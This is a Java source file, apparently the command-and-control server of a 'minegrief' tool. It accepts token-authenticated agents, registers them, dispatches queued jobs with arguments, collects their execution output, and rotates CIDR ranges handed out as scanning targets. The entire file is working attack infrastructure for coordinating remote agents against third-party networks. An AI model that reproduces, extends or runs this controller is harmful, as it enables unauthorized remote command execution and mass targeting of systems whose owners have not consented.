package com.chebuya.minegriefserver.controller;

import com.chebuya.minegriefserver.jobs.JobOutput;
import com.chebuya.minegriefserver.jobs.JobRequest;
import com.chebuya.minegriefserver.transport.ServerTransport;

import java.io.IOException;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import static com.chebuya.minegriefserver.admin.AdminService.getJob;
import static com.chebuya.minegriefserver.admin.AdminService.putJobOutput;
import static com.chebuya.minegriefserver.util.JsonUtils.jsonToMap;
import static com.chebuya.minegriefserver.util.JsonUtils.mapToJson;
import static com.chebuya.minegriefserver.util.Logging.LOGGER;

public class ControllerService {
    private final String REGISTER = "register";
    private final String CHECKIN = "checkin";

    private final String ACTION = "action";
    private final String JOBID = "job_id";
    private final String ARGS = "args";
    private final String EXECUTE = "execute";
    private final String OUTPUT = "output";
    private final String TARGETS = "targets";

    private ServerTransport transport;
    private int port;
    private String ip;

    private Boolean running;
    private ServerSocket serverSocket;
    private ExecutorService executorService;

    private String[] cidrs;
    private int cidrIndex = 0;

    private ArrayList<String> authTokens;
    private Map<String, String> authMap;

    private static ArrayList<Agent> agents;

    public ControllerService(ServerTransport transport, String ip, int port, String[] cidrs, ArrayList<String> authTokens) {
        this.transport = transport;
        this.ip = ip;
        this.port = port;

        this.cidrs = cidrs;

        this.authTokens = authTokens;
        this.authMap = new HashMap<String, String>();

        this.agents = new ArrayList<Agent>();
    }

    public void Start() {
        this.executorService = Executors.newCachedThreadPool();

        try {
            this.serverSocket = new ServerSocket(port, 0, InetAddress.getByName(ip));
        } catch (IOException e) {
            LOGGER.warning("(client_controller) could not bind to " + ip + ":" + port + ": " + e.getMessage());
            throw new RuntimeException(e);
        }

        running = true;
        LOGGER.info("(client_controller) waiting for connections");
        new Thread(() -> acceptClients()).start();
    }


    private void acceptClients() {
        while (running) {
            try {
                Socket clientSocket = serverSocket.accept();
                executorService.execute(() -> handleClient(clientSocket));
            } catch (IOException e) {
                if (running) {
                    LOGGER.warning("(client_controller) error accepting client connection: " + e.getMessage());
                }
            }
        }
    }

    private void handleClient(Socket clientSocket) {
        String requestBody = "", responseBody = "";

        try {
            requestBody = transport.untransformData(transport.receiveData(clientSocket));
            LOGGER.info("(client_controller) request body: " + requestBody);
        } catch (Exception e) {
            LOGGER.warning("(client_controller) error while receiving data: " + e.getMessage());
            return;
        }

        try {
            responseBody = processRequest(requestBody, clientSocket.getRemoteSocketAddress().toString().split("/")[1].split(":")[0]);
            LOGGER.info("(client_controller) response body: " + responseBody);
        } catch (SecurityException e) {
            LOGGER.warning("(client_controller) security violation from " + clientSocket.getLocalAddress() + ":" + clientSocket.getLocalPort());
            try {
                clientSocket.close();
            } catch (IOException ioException) {
                LOGGER.warning("(client_controller) unable to close socket: " + ioException.getMessage());
            }
            return;
        }

        try {
            transport.sendData(clientSocket, transport.transformData(responseBody));
        } catch (Exception e) {
            LOGGER.warning("(client_controller) error while sending data: " + e.getMessage());
            return;
        }

        try {
            clientSocket.close();
        } catch (IOException e) {
            LOGGER.warning("(client_controller) unable to close socket: " + e.getMessage());
            return;
        }
    }

    private String processRequest(String requestBody, String clientIP) throws SecurityException {
        Map<String, String> requestPayload = null, responsePayload = null;

        requestPayload = jsonToMap(requestBody);
        String action = requestPayload.get(ACTION);
        String token = requestPayload.get("token");

        if (!authTokens.contains(token)) {
            LOGGER.warning("(client_controller) a checkin attempt with an invalid token (" + token + ") occurred");
            throw new SecurityException("Access denied");
        }

        if (!action.equals(REGISTER) && (!token.equals(authMap.get(requestPayload.get("id"))))) {
            LOGGER.warning("(client_controller) a checkin attempt with an non-matching id/token (" + requestPayload.get("id") + ":" + token + ") occurred");
            throw new SecurityException("Access denied");
        }

        responsePayload = new HashMap<String, String>();
        switch (action) {
            case REGISTER:
                String uuid = UUID.randomUUID().toString();
                authMap.put(uuid, token);

                responsePayload.put(ACTION, REGISTER);
                responsePayload.put("id", uuid);

                LOGGER.info("(client_controller) new client connected: " + uuid);

                String[] registerInfo = requestPayload.get(ARGS).split("\\|");
                agents.add(new Agent(uuid, registerInfo[0], registerInfo[1], clientIP));
                break;
            case EXECUTE:
                putJobOutput(new JobOutput(requestPayload.get("id"), requestPayload.get(JOBID), requestPayload.get(ACTION), requestPayload.get(OUTPUT)));
                // continue to checkin
            case TARGETS:
                LOGGER.info(requestPayload.get("id") + " asked for more targets");
                responsePayload.put(ACTION, TARGETS);
                responsePayload.put(ARGS, getCidr());
                break;
            default:
                String id = requestPayload.get("id");
                JobRequest jobRequest;
                try {
                    jobRequest = getJob(id);
                } catch (NoSuchElementException e) {
                    responsePayload.put(ACTION, CHECKIN);
                    break;
                }

                responsePayload.put(ACTION, jobRequest.getAction());
                responsePayload.put(ARGS, jobRequest.getArgs());
                responsePayload.put(JOBID, jobRequest.getJobId());
        }

        return mapToJson(responsePayload);
    }

    private String getCidr() {
        if (cidrIndex == cidrs.length - 1) {
            cidrIndex = 0;
        } else {
            cidrIndex += 1;
        }

        return cidrs[cidrIndex];
    }

    public static ArrayList<Agent> getAgents() {
        return agents;
    }
}
